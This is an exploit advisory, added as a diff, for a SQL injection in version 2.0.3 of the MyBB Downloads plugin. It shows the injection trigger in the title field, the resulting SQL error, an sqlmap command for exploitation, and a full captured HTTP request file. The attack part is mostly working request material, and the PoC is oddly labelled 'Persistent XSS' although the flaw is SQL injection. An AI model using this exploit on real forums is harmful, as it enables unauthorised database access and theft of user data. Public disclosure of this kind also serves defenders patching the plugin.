@@ -1,0 +1,86 @@
+# Exploit Title: MyBB Downloads 2.0.3 - SQL Injection
+# Date: 28-10-2018
+# Exploit Author: Lucian Ioan Nitescu
+# Contact: https://twitter.com/LucianNitescu
+# Webiste: https://nitesculucian.github.io
+# Vendor Homepage: https://github.com/vintagedaddyo/MyBB_Plugin-Downloads
+# Software Link: https://github.com/vintagedaddyo/MyBB_Plugin-Downloads
+# Version: 2.0.3
+# Tested on: Ubuntu 18.04
+
+1. Description:  
+
+It is a plugin which adds a page to download files. If enabled, regular members can add new downloads to the page after admin approval.  
+
+2. Proof of Concept: 
+
+Persistent XSS  
+- Go to downloads.php page  
+- Create a New Download  
+- Add the following to the title: a"
+- Now on submit, the user will be prompted to an SQL Injection specific error.
+
+```
+MyBB has experienced an internal SQL error and cannot continue.
+
+SQL Error:
+	1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"a""' at line 1
+Query:
+	SELECT * FROM mybb_downloads WHERE name="a""
+```
+
+- THis can be exploited with: sqlmap -r request_file -p name --threads 5
+
+3. Request File example:
+
+POST /downloads.php?newdownload=1 HTTP/1.1
+Host: localhost:8081
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:8081/downloads.php?newdownload=1
+Content-Type: multipart/form-data; boundary=---------------------------171894060312075061251712806160
+Content-Length: 1029
+Cookie: mybb[lastvisit]=1540744980; mybb[lastactive]=1540745020; sid=677a58d33fe23e7f2ea3841c79496fcd; loginattempts=1; mybbuser=3_waeMfSMiIRrTpPqW2uy8ZF8AMx8pyRtMCUJ6Gx0yoGRyLBsBow
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="my_post_key"
+
+6cb47e578ed16aa5272c55b0cb8745b4
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="name"
+
+a"
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="shortdesc"
+
+test
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="description"
+
+test
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="image"
+
+
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="url"
+
+1
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="numimages"
+
+4
+-----------------------------171894060312075061251712806160
+Content-Disposition: form-data; name="submit"
+
+Publish download
+-----------------------------171894060312075061251712806160--
+
+3. Solution:
+
+There is no public available solution.
